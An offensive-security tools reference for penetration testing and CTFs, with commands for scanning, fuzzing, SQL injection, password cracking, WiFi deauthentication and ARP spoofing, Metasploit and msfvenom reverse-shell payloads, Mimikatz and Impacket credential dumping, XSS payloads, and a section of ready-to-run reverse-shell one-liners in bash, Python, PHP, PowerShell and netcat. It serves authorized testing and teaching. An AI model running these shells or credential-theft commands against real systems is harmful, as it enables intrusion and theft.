# Cybersecurity & Ethical Hacking — Tools Reference

Comprehensive toolkit for penetration testing, CTF challenges, security research, and defensive security.
Updated: April 2026.

> **Legal Notice:** Use these tools only on systems you own or have explicit written authorization to test.
> Unauthorized access to computer systems is illegal in most jurisdictions.

---

## Quick Navigation

| Category | Tools |
|---|---|
| [Reconnaissance](#reconnaissance) | nmap, Shodan, theHarvester, recon-ng, Amass |
| [Web Application](#web-application-security) | Burp Suite, OWASP ZAP, sqlmap, nikto, ffuf, gobuster |
| [Exploitation](#exploitation-frameworks) | Metasploit, ExploitDB, pwntools |
| [Password Attacks](#password-attacks) | Hashcat, John the Ripper, Hydra, Medusa |
| [Network Attacks](#network-attacks) | Aircrack-ng, Wireshark, Bettercap, tcpdump |
| [Post-Exploitation](#post-exploitation) | Mimikatz, BloodHound, CrackMapExec, Impacket |
| [Reverse Engineering](#reverse-engineering) | Ghidra, Radare2, pwndbg, GDB |
| [Forensics](#digital-forensics) | Volatility, Autopsy, Sleuth Kit, Binwalk |
| [OSINT](#osint---open-source-intelligence) | Maltego, OSINT Framework, Sherlock, SpiderFoot |
| [CTF Tools](#ctf-tools) | pwntools, CyberChef, stegsolve, StegHide |
| [Defensive Security](#defensive-security) | OSSEC, Suricata, Fail2Ban, Lynis |
| [Kali / Parrot](#kali-linux--parrot-os) | Distribution setup |

---

## Environment Setup

### Kali Linux (recommended for pentest)

```bash
# Install on WSL2
wsl --install -d kali-linux

# Install on VirtualBox / VMware
# Download from: https://www.kali.org/get-kali/

# Docker
docker pull kalilinux/kali-rolling
docker run -it --network=host kalilinux/kali-rolling /bin/bash

# Install full metapackage
sudo apt update
sudo apt install -y kali-linux-everything   # full suite (~20GB)
sudo apt install -y kali-linux-top10        # top 10 tools
sudo apt install -y kali-linux-headless     # no GUI tools
```

### Parrot OS Security

```bash
# Docker
docker pull parrotsec/security
docker run -it --network=host parrotsec/security /bin/bash
```

### macOS Security Setup

```bash
# Core pentest tools
brew install nmap netcat wireshark sqlmap hydra john hashcat
brew install gobuster ffuf nuclei nikto whatweb

# Python security libs
pip install requests pwntools scapy impacket paramiko

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && sudo ./msfinstall
```

---

## Reconnaissance

### Passive Recon

```bash
# WHOIS
whois example.com
whois 8.8.8.8

# DNS enumeration
dig example.com ANY
dig example.com NS
dig example.com MX
dig axfr @ns1.example.com example.com   # zone transfer

# Subdomain enumeration
# Amass
amass enum -d example.com
amass enum -d example.com -src          # show sources
amass enum -d example.com -o amass.txt

# theHarvester — emails, subdomains, IPs
theHarvester -d example.com -l 500 -b all
theHarvester -d example.com -b google,bing,shodan

# subfinder
subfinder -d example.com
subfinder -d example.com -o subdomains.txt

# dnsx — resolve + filter
cat subdomains.txt | dnsx -a -resp
cat subdomains.txt | dnsx -cname -resp
```

---

### Active Recon (nmap)

```bash
# Host discovery
nmap -sn 192.168.1.0/24                    # ping sweep
nmap -PR 192.168.1.0/24                    # ARP scan (LAN)

# Full port scan + service detection
nmap -p- -sV -sC -O -T4 192.168.1.1
# -p-   : all ports
# -sV   : service version
# -sC   : default scripts
# -O    : OS detection
# -T4   : aggressive timing

# Common NSE scripts
nmap --script=http-title -p 80,443,8080 192.168.1.0/24
nmap --script=smb-enum-shares -p 445 192.168.1.1
nmap --script=ftp-anon -p 21 192.168.1.1
nmap --script=ssh-brute -p 22 192.168.1.1
nmap --script=vuln 192.168.1.1
nmap --script=safe -p 80 192.168.1.1

# UDP scan (slower)
nmap -sU -p 53,67,68,161,162 192.168.1.0/24

# Output all formats
nmap -p- -sV -oA scan_results 192.168.1.1
```

---

### Shodan CLI

```bash
# Install
pip install shodan

# Initialize with API key
shodan init $SHODAN_API_KEY

# Search
shodan search "apache 2.4"
shodan search "port:22 country:US"
shodan search "ssl.cert.subject.cn:example.com"

# Host info
shodan host 8.8.8.8

# Count results
shodan count "nginx"
shodan count "port:3389"     # RDP exposed

# My IP info
shodan myip
shodan info

# Download results
shodan download output.json.gz "apache"
shodan parse --fields ip_str,port output.json.gz
```

---

### recon-ng

```bash
# Start
recon-ng

# Commands
workspaces create myproject
modules search
modules load recon/domains-hosts/google_site_web
options set SOURCE example.com
run

# Useful modules
# recon/domains-hosts/hackertarget
# recon/domains-hosts/threatcrowd
# recon/hosts-hosts/resolve
# recon/contacts-contacts/mailtester
# reporting/html
```

---

## Web Application Security

### Burp Suite

```bash
# Install Community (free) / Pro
# Download: https://portswigger.net/burp

# Setup FoxyProxy in browser → Burp at 127.0.0.1:8080
# Install Burp CA cert → http://burpsuite (in browser through proxy)

# Useful extensions (BApp Store)
# - Autorize (authorization testing)
# - CSRF Scanner
# - Active Scan++
# - JWT Editor
# - Param Miner
# - Turbo Intruder
```

---

### OWASP ZAP

```bash
# Install
brew install --cask owasp-zap
# or Docker:
docker run -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable \
  zap-baseline.py -t https://example.com

# CLI scan
zap-cli quick-scan https://example.com
zap-cli active-scan https://example.com
zap-cli report -o report.html -f html

# API mode
zap.sh -daemon -port 8090 -config api.disablekey=true
```

---

### sqlmap — Automated SQL Injection

```bash
# Basic test
sqlmap -u "https://example.com/page?id=1"

# POST request
sqlmap -u "https://example.com/login" --data="user=admin&pass=test"

# From Burp request file
sqlmap -r burp_request.txt

# Specific database
sqlmap -u "https://example.com/?id=1" --dbms=mysql

# Enumerate
sqlmap -u "https://example.com/?id=1" --dbs                  # databases
sqlmap -u "https://example.com/?id=1" -D mydb --tables       # tables
sqlmap -u "https://example.com/?id=1" -D mydb -T users --dump # dump table

# OS command execution (if vulnerable)
sqlmap -u "https://example.com/?id=1" --os-shell

# WAF bypass
sqlmap -u "https://example.com/?id=1" --tamper=space2comment,between
sqlmap -u "https://example.com/?id=1" --random-agent --level=5 --risk=3

# Cookies / auth
sqlmap -u "https://example.com/profile" \
       --cookie="session=abc123" \
       --level=5
```

---

### nikto — Web Server Scanner

```bash
# Install
brew install nikto
sudo apt install nikto

# Basic scan
nikto -h https://example.com

# Specific port
nikto -h 192.168.1.1 -p 8080

# Scan with authentication
nikto -h https://example.com -id admin:password

# Output formats
nikto -h https://example.com -o report.html -Format htm
nikto -h https://example.com -o report.txt -Format txt

# Tuning (test types)
nikto -h https://example.com -Tuning 1234567890abcd

# Through Burp proxy
nikto -h https://example.com -useproxy http://127.0.0.1:8080
```

---

### ffuf — Web Fuzzer

```bash
# Install
brew install ffuf
go install github.com/ffuf/ffuf/v2@latest

# Directory bruteforce
ffuf -u https://example.com/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt

# With extensions
ffuf -u https://example.com/FUZZ \
     -w wordlist.txt \
     -e .php,.html,.txt,.bak

# Filter by status code
ffuf -u https://example.com/FUZZ \
     -w wordlist.txt \
     -fc 404,403

# Filter by response size
ffuf -u https://example.com/FUZZ \
     -w wordlist.txt \
     -fs 1234

# Subdomain fuzzing
ffuf -u https://FUZZ.example.com \
     -w subdomains.txt \
     -H "Host: FUZZ.example.com"

# POST parameter fuzzing
ffuf -u https://example.com/login \
     -w wordlist.txt \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -fc 401

# Rate limiting
ffuf -u https://example.com/FUZZ \
     -w wordlist.txt \
     -rate 100                  # requests per second
```

---

### gobuster — Directory/DNS/VHost Bruteforce

```bash
# Install
brew install gobuster
go install github.com/OJ/gobuster/v3@latest

# Directory mode
gobuster dir \
  -u https://example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt \
  -t 50

# DNS mode (subdomain enumeration)
gobuster dns \
  -d example.com \
  -w subdomains.txt \
  -t 50

# VHost mode
gobuster vhost \
  -u https://example.com \
  -w vhosts.txt \
  --append-domain

# S3 bucket enumeration
gobuster s3 \
  -w buckets.txt
```

---

### Nuclei — Vulnerability Scanner

```bash
# Install
brew install nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Basic scan
nuclei -u https://example.com

# Specific severity
nuclei -u https://example.com -severity critical,high

# Specific tags
nuclei -u https://example.com -tags cve,sqli,xss

# List of targets
nuclei -l targets.txt -severity medium,high,critical

# Custom template
nuclei -u https://example.com -t ./my-template.yaml

# Output
nuclei -u https://example.com -o results.txt
nuclei -u https://example.com -json-export results.json
```

---

### XSS Tools

```bash
# Manual payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
<svg onload=alert(1)>
<body onload=alert(1)>

# XSStrike — advanced XSS finder
pip install xsstrike
xsstrike -u "https://example.com/search?q=test"
xsstrike -u "https://example.com/search?q=test" --crawl
xsstrike -u "https://example.com/search?q=test" --blind

# dalfox — parameter analysis + XSS
go install github.com/hahwul/dalfox/v2@latest
dalfox url "https://example.com/search?q=test"
dalfox file urls.txt
dalfox pipe < urls.txt
```

---

## Exploitation Frameworks

### Metasploit

```bash
# Install
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && sudo ./msfinstall
msfdb init

# Start
msfconsole

# Basic workflow
search eternalblue              # search for exploit
use exploit/windows/smb/ms17_010_eternalblue
info                            # show module info
show options
set RHOSTS 192.168.1.1
set LHOST 10.0.0.1              # your IP
set LPORT 4444
exploit                         # or: run

# Meterpreter commands
help
sysinfo
getuid
getsystem                       # privilege escalation
shell                           # drop to system shell
background                      # background session
sessions -l                     # list sessions
sessions -i 1                   # interact with session 1

# Post-exploitation
run post/windows/gather/hashdump
run post/multi/recon/local_exploit_suggester
migrate <PID>                   # migrate to another process

# Payloads
msfvenom -l payloads            # list all payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php

# Handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
run -j                          # run as job
```

---

### pwntools — CTF & Exploit Dev

```bash
# Install
pip install pwntools

# Install dependencies (Ubuntu)
sudo apt install python3-pwntools
```

```python
from pwn import *

# Remote connection
r = remote('pwn.ctf.example.com', 1337)

# Local process
r = process('./vulnerable_binary')

# GDB debugging
r = gdb.debug('./vulnerable_binary', '''
    break main
    continue
''')

# Send / receive
r.sendline(b'hello')
r.send(b'data')
data = r.recv(1024)
line = r.recvline()
r.recvuntil(b'Enter name: ')
r.interactive()

# Build payload (ROP)
elf = ELF('./binary')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = flat(
    b'A' * 72,              # padding to overflow
    rop.chain()
)

r.sendline(payload)

# Shellcode
shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.linux.sh())

# Packing
p32(0xdeadbeef)             # pack as 32-bit little endian
p64(0xdeadbeefcafebabe)     # pack as 64-bit
u32(b'\xef\xbe\xad\xde')   # unpack
u64(data)

# Log
log.info("Got leak: %#x", leak)
log.success("Shell obtained!")
```

---

## Password Attacks

### Hashcat — GPU Password Cracker

```bash
# Install
brew install hashcat
sudo apt install hashcat

# Hash identification
hashcat --identify hash.txt
# or: hash-identifier

# Attack modes
# 0 = Dictionary, 1 = Combination, 3 = Brute-force/Mask, 6 = Wordlist+Mask, 7 = Mask+Wordlist

# Dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 0   = MD5
# -m 100 = SHA1
# -m 1000 = NTLM (Windows)
# -m 1800 = sha512crypt (Linux /etc/shadow)
# -m 3200 = bcrypt
# -m 22000 = WPA-PBKDF2-PMKID+EAPOL

# Mask attack (brute force)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# Masks: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# Combination attack
hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt

# Resume
hashcat --restore

# Show cracked
hashcat -m 0 hashes.txt --show

# Performance
hashcat -m 0 -a 0 hashes.txt rockyou.txt \
  --optimized-kernel-enable \
  --workload-profile 3         # 1=low, 2=default, 3=high, 4=nightmare

# Common hash types
# MD5       : -m 0
# SHA-1     : -m 100
# SHA-256   : -m 1400
# SHA-512   : -m 1700
# bcrypt    : -m 3200
# WPA2      : -m 22000
# NTLM      : -m 1000
# Net-NTLMv2: -m 5600
```

---

### John the Ripper

```bash
# Install
brew install john
sudo apt install john

# Basic crack
john hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --format=raw-md5

# Show results
john --show hashes.txt

# Formats
john --list=formats
john hashes.txt --format=bcrypt

# Incremental (brute force)
john hashes.txt --incremental

# Rules
john hashes.txt --wordlist=rockyou.txt --rules

# Extract hashes from files
# PDF
pdf2john file.pdf > pdf_hash.txt
john pdf_hash.txt --wordlist=rockyou.txt

# ZIP
zip2john archive.zip > zip_hash.txt
john zip_hash.txt

# SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt

# /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

---

### Hydra — Network Brute Forcer

```bash
# Install
brew install hydra
sudo apt install hydra

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# HTTP form
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP basic auth
hydra -l admin -P rockyou.txt -s 443 https://192.168.1.1 http-get /admin

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.1

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.1

# SMB
hydra -l admin -P rockyou.txt smb://192.168.1.1

# SMTP
hydra -l user@example.com -P rockyou.txt smtp://mail.example.com

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.1

# Options
# -t 4   : 4 parallel connections (be careful with lockouts)
# -W 3   : wait 3 seconds between retries
# -V     : verbose output
# -o output.txt : save results
hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4 -V -o results.txt
```

---

## Network Attacks

### Aircrack-ng — WiFi Security

```bash
# Install
brew install aircrack-ng
sudo apt install aircrack-ng

# Enable monitor mode
sudo airmon-ng start wlan0
# interface is now wlan0mon

# Scan networks
sudo airodump-ng wlan0mon

# Capture specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6        : channel 6
# --bssid     : target AP MAC
# -w capture  : save to capture-01.cap

# Deauth attack (force clients to reconnect → capture handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# -a : AP MAC
# 10 : number of deauth packets

# Crack WPA2 handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# WPS attack (pixie dust)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```

---

### Bettercap — Network Attack Framework

```bash
# Install
brew install bettercap
sudo apt install bettercap

# Start
sudo bettercap -iface eth0

# Interactive commands
net.probe on                    # discover hosts
net.show                        # show discovered hosts
arp.spoof.targets 192.168.1.50  # target IP
arp.spoof on                    # ARP poisoning (MITM)
net.sniff on                    # sniff traffic

# HTTP/HTTPS proxy
https.proxy on
set https.proxy.sslstrip true   # SSL stripping

# Capture credentials
set net.sniff.verbose true
set net.sniff.regexp ".*password.*"

# WiFi scanning
wifi.recon on
wifi.show
wifi.deauth AA:BB:CC:DD:EE:FF   # deauth attack

# Script/caplet
bettercap -iface eth0 -caplet mitm.cap
```

---

### Scapy — Packet Crafting (Python)

```python
from scapy.all import *

# Send ICMP ping
send(IP(dst="192.168.1.1")/ICMP())

# TCP SYN scan
ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=[22,80,443], flags="S"), timeout=2)
for s, r in ans:
    print(f"Port {r.sport} is open")

# ARP request
answered, _ = sr(ARP(pdst="192.168.1.0/24"), timeout=2)
for s, r in answered:
    print(f"{r.psrc} — {r.hwsrc}")

# Sniff packets
sniff(iface="eth0", prn=lambda x: x.summary(), count=10)
sniff(iface="eth0", filter="tcp port 80", prn=lambda x: x.show())

# Custom packet
packet = Ether()/IP(dst="10.0.0.1")/TCP(dport=80, flags="S")/Raw(b"GET / HTTP/1.0\r\n\r\n")
sendp(packet, iface="eth0")

# DNS query
ans = sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname="example.com")))
print(ans[DNS].an)

# Read PCAP
packets = rdpcap("capture.pcap")
for p in packets:
    if p.haslayer(TCP):
        print(p[TCP].payload)
```

---

## Post-Exploitation

### Common Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat (if -e available)
nc -e /bin/sh 10.0.0.1 4444

# Netcat (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f

# Listener
nc -lvnp 4444
rlwrap nc -lvnp 4444            # with readline (arrow keys work)

# Upgrade shell to fully interactive
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### Linux Privilege Escalation

```bash
# System info
id && whoami
uname -a
cat /etc/os-release
cat /etc/passwd
sudo -l                         # what sudo can we run

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Services running as root
ps aux | grep root

# Network
netstat -tulnp
ss -tulnp

# Check for interesting files
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
cat ~/.bash_history

# Automated: LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Automated: linux-smart-enumeration
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh && bash lse.sh -l 1
```

---

### Windows Post-Exploitation

```powershell
# Situational awareness
whoami /all
net users
net localgroup administrators
systeminfo
ipconfig /all
netstat -ano

# Check privileges
whoami /priv

# Find interesting files
Get-ChildItem -Recurse -Filter "*.txt" | Where-Object { $_.Name -match "pass|cred|secret" }
dir /s /b C:\*pass*.txt C:\*cred*.txt

# Credential hunting
type C:\Windows\repair\SAM
type C:\Windows\repair\SYSTEM
reg query HKLM /f password /t REG_SZ /s

# Automated: WinPEAS
# Download winPEAS.exe and run:
.\winPEAS.exe

# PowerShell history
Get-Content (Get-PSReadlineOption).HistorySavePath
```

---

### Mimikatz — Windows Credential Extraction

```powershell
# Run as Administrator
.\mimikatz.exe

# Dump credentials from memory
privilege::debug
sekurlsa::logonpasswords

# Dump SAM database (local accounts)
token::elevate
lsadump::sam

# Pass-the-hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe

# Golden ticket
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-... /krbtgt:<hash> /id:500

# Exit
exit
```

---

### BloodHound — Active Directory Attack Paths

```bash
# Install (Docker)
docker run -p7474:7474 -p7687:7687 \
  -e NEO4J_AUTH=neo4j/password \
  neo4j:latest

# Install BloodHound GUI
# Download from: https://github.com/SpecterOps/BloodHound

# Collect data (SharpHound — run on Windows target)
.\SharpHound.exe -c All
.\SharpHound.exe -c DCOnly --ldapusername admin --ldappassword Password123

# Python collector (from Linux)
pip install bloodhound
bloodhound-python -d corp.local -u admin -p Password123 -c All -ns 192.168.1.1

# Import ZIP into BloodHound
# Upload Data → select ZIP → start analysis

# Key queries
# - Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
```

---

### Impacket — Windows Protocol Suite

```bash
# Install
pip install impacket

# secretsdump — dump hashes remotely
secretsdump.py admin:Password123@192.168.1.1
secretsdump.py -hashes ':NTLM_HASH' admin@192.168.1.1

# psexec — remote code execution
psexec.py admin:Password123@192.168.1.1
psexec.py -hashes ':NTLM_HASH' admin@192.168.1.1

# wmiexec — WMI execution
wmiexec.py admin:Password123@192.168.1.1

# smbclient — SMB shares
smbclient.py admin:Password123@192.168.1.1

# GetUserSPNs — Kerberoasting
GetUserSPNs.py corp.local/admin:Password123 -dc-ip 192.168.1.1 -request

# GetNPUsers — AS-REP Roasting
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.1

# ticketer — Golden/Silver tickets
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-... -domain corp.local administrator
```

---

## Reverse Engineering

### Ghidra — NSA Reverse Engineering Tool

```bash
# Install
brew install ghidra
# or: https://ghidra-sre.org/

# Launch
ghidra

# Key features:
# - Decompiler (pseudo-C code)
# - Disassembler
# - Symbol analysis
# - Patching

# Scripts (Python/Java)
# Window → Script Manager → New script
```

---

### Radare2 — Terminal RE Framework

```bash
# Install
brew install radare2
sudo apt install radare2

# Open binary
r2 ./binary
r2 -A ./binary              # analyze all on open
r2 -d ./binary              # debug mode

# Common commands
aa                           # analyze all
afl                          # list functions
pdf @ main                   # disassemble main
pdf @ sym.vulnerable_func
p8 32 @ 0x401000             # print 32 bytes at address
px 64 @ rsp                  # hexdump 64 bytes from RSP
dr                           # show registers
db 0x401234                  # set breakpoint
dc                           # continue execution
ds                           # single step
iz                           # strings in data section
iS                           # sections
ie                           # entry points
```

---

### GDB + pwndbg

```bash
# Install pwndbg (GDB plugin)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# GDB commands
gdb ./binary
gdb ./binary core             # with core dump

# pwndbg commands
run
r < input.txt                 # run with input
b main                        # breakpoint at main
b *0x401234                   # breakpoint at address
c                             # continue
n                             # next (step over)
s                             # step (into)
ni                            # next instruction
si                            # step instruction
x/20x $rsp                   # examine 20 hex words at RSP
x/s 0x601000                  # examine as string
info registers
info functions
disassemble main
context                       # pwndbg: full context display
stack                         # pwndbg: show stack
heap                          # pwndbg: heap view
vmmap                         # pwndbg: memory mappings
checksec                      # pwndbg: binary protections
```

---

### checksec — Binary Protections

```bash
# Install
pip install checksec.py
# or: included with pwntools

checksec ./binary
checksec --file=./binary

# Output:
# RELRO      STACK CANARY   NX    PIE    Fortify  Symbols
# Full       Yes            Yes   Yes    Yes      No

# Protections explained:
# RELRO      : relocations are read-only after init
# Stack Canary: detects stack overflows
# NX         : no-execute (stack not executable)
# PIE        : position independent executable (ASLR)
# Fortify    : _FORTIFY_SOURCE compile-time checks
```

---

## Digital Forensics

### Volatility — Memory Forensics

```bash
# Install
pip install volatility3

# Image info
vol -f memory.dmp windows.info
vol -f memory.dmp linux.bash

# Process analysis
vol -f memory.dmp windows.pslist
vol -f memory.dmp windows.pstree
vol -f memory.dmp windows.cmdline
vol -f memory.dmp windows.dlllist --pid 1234

# Network
vol -f memory.dmp windows.netstat
vol -f memory.dmp windows.netscan

# Registry
vol -f memory.dmp windows.registry.hivelist
vol -f memory.dmp windows.registry.printkey --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Dump process
vol -f memory.dmp windows.dumpfiles --pid 1234

# Password extraction
vol -f memory.dmp windows.hashdump
vol -f memory.dmp windows.lsadump

# Malware detection
vol -f memory.dmp windows.malfind
vol -f memory.dmp windows.hollowprocesses
```

---

### Binwalk — Firmware Analysis

```bash
# Install
brew install binwalk
sudo apt install binwalk

# Scan
binwalk firmware.bin

# Extract all
binwalk -e firmware.bin
binwalk --extract firmware.bin

# Entropy analysis (detect encryption)
binwalk -E firmware.bin

# Recursive extraction
binwalk -Me firmware.bin

# Signature scan
binwalk -B firmware.bin

# String search
binwalk -R "password" firmware.bin
```

---

### Foremost / Scalpel — File Carving

```bash
# Install
sudo apt install foremost scalpel

# foremost
foremost -t all -i disk.img -o output/
foremost -t jpg,png,pdf -i disk.img -o output/

# scalpel
scalpel disk.img -o output/
```

---

### Autopsy — Digital Forensics Platform

```bash
# Install (GUI)
# macOS: brew install --cask autopsy
# Linux: https://www.autopsy.com/download/

# Features:
# - Disk image analysis (E01, raw, vmdk)
# - File system browsing
# - Deleted file recovery
# - Web artifact extraction
# - Email extraction
# - Keyword search
# - Timeline analysis
# - Hash filtering (NSRL)
```

---

## OSINT — Open Source Intelligence

### Sherlock — Username Search

```bash
# Install
pip install sherlock-project
# or
git clone https://github.com/sherlock-project/sherlock
cd sherlock && pip install -r requirements.txt

# Search username across 400+ sites
sherlock username
sherlock username --output results.txt
sherlock username --timeout 10
sherlock username --csv
```

---

### theHarvester — Email & Subdomain OSINT

```bash
# Install
pip install theHarvester

# Gather info
theHarvester -d example.com -l 500 -b all
theHarvester -d example.com -b google
theHarvester -d example.com -b linkedin
theHarvester -d example.com -b shodan
theHarvester -d example.com -b bing,google,yahoo -l 200 -f results.html

# Data sources: google, bing, yahoo, baidu, shodan,
#               hunter, linkedin, twitter, github, etc.
```

---

### SpiderFoot — Automated OSINT

```bash
# Install
pip install spiderfoot
spiderfoot -l 127.0.0.1:5001    # web UI

# CLI scan
spiderfoot -s example.com -m all -o csv -o results.csv

# Modules include: DNS, WHOIS, social media,
#                  breach databases, Shodan, etc.
```

---

### Google Dorks (Manual OSINT)

```
# Find login pages
site:example.com inurl:login
site:example.com inurl:admin

# Find exposed files
site:example.com filetype:pdf
site:example.com filetype:xlsx "password"
site:example.com ext:log

# Find config files
site:example.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf

# Find error pages (potential info disclosure)
site:example.com "SQL syntax" | "mysql_fetch" | "Warning: mysql"

# Exposed cameras
inurl:"/view/index.shtml"
intitle:"Live View / - AXIS"

# Exposed databases
intitle:"phpMyAdmin" "Welcome to phpMyAdmin"
intitle:"MongoDB" inurl:28017

# AWS S3 buckets
site:s3.amazonaws.com "example.com"

# GitHub secrets
site:github.com "example.com" password
site:github.com "example.com" secret_key
```

---

## CTF Tools

### CyberChef — Data Transformation

```bash
# Web tool: https://gchq.github.io/CyberChef
# Local install:
docker run -d -p 8080:80 mpepping/cyberchef

# Common operations:
# - Base64 encode/decode
# - ROT13
# - XOR
# - AES/DES encrypt/decrypt
# - JWT decode
# - Hex to text
# - Regex extraction
# - Entropy analysis
```

---

### Steganography Tools

```bash
# steghide — hide/extract from images
brew install steghide
steghide embed -cf image.jpg -sf secret.txt -p password
steghide extract -sf image.jpg -p password

# zsteg — PNG/BMP analysis
gem install zsteg
zsteg image.png
zsteg -a image.png             # all methods

# exiftool — metadata
brew install exiftool
exiftool image.jpg             # read metadata
exiftool -all= image.jpg       # strip all metadata

# strings — find hidden text
strings image.jpg
strings -n 8 binary_file

# binwalk — find embedded files in images
binwalk image.png
binwalk -e image.png           # extract

# pngcheck — PNG analysis
pngcheck -v image.png

# Steg solver (Java GUI)
java -jar stegsolve.jar
```

---

### Crypto CTF Tools

```bash
# RSA (Python)
from Crypto.Util.number import long_to_bytes, bytes_to_long
from sympy import factorint

# Factor small RSA modulus
n = 123456789...
factors = factorint(n)

# CRT for RSA
from sympy.ntheory.modular import crt

# Common CTF crypto tools
pip install pycryptodome sympy gmpy2

# Base encodings
echo "SGVsbG8=" | base64 -d           # base64
echo "48656c6c6f" | xxd -r -p         # hex
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13

# factordb.com — online factoring database
# dcode.fr      — cipher/encoding identifier
# quipqiup.com  — frequency analysis
# rumkin.com    — cipher tools
```

---

### Common CTF One-Liners

```bash
# Find flags with regex
grep -rE "CTF\{[^\}]+\}" .
grep -rE "[A-Z0-9_]{3,}\{[^\}]+\}" .
strings file | grep -i "flag"

# Decode all base64 strings in a file
strings file | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | while read b64; do echo "$b64" | base64 -d 2>/dev/null; done

# Find hidden text in image
strings image.jpg | tail -20
xxd image.jpg | grep -A2 -B2 "flag"

# XOR brute force (Python)
python3 -c "
data = open('encrypted', 'rb').read()
for key in range(256):
    dec = bytes([b ^ key for b in data])
    if b'flag' in dec or b'CTF' in dec:
        print(f'Key: {key}, Data: {dec}')
"

# Frequency analysis
python3 -c "
from collections import Counter
text = open('cipher.txt').read()
print(Counter(text).most_common(10))
"
```
